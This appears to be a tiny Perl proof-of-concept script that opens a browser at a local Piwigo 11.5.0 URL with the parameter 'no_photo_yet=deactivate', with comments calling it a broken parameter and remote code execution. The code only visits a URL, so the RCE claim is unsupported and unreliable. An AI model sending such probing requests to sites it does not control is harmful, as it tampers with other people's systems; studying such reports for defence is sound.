#!/usr/bin/perl
use strict;
use warnings;
use diagnostics;

use Browser::Open qw( open_browser );
# Broken parameter (no_photo_yet) when someone is visiting from outside; 
# Remote code execution: broken front end element;

my $url = 'http://192.168.1.160/Piwigo-11.5.0/?no_photo_yet=deactivate';
open_browser($url);
	print "Please fix your (no_photo_yet) parameter query";
	exit 0;
	
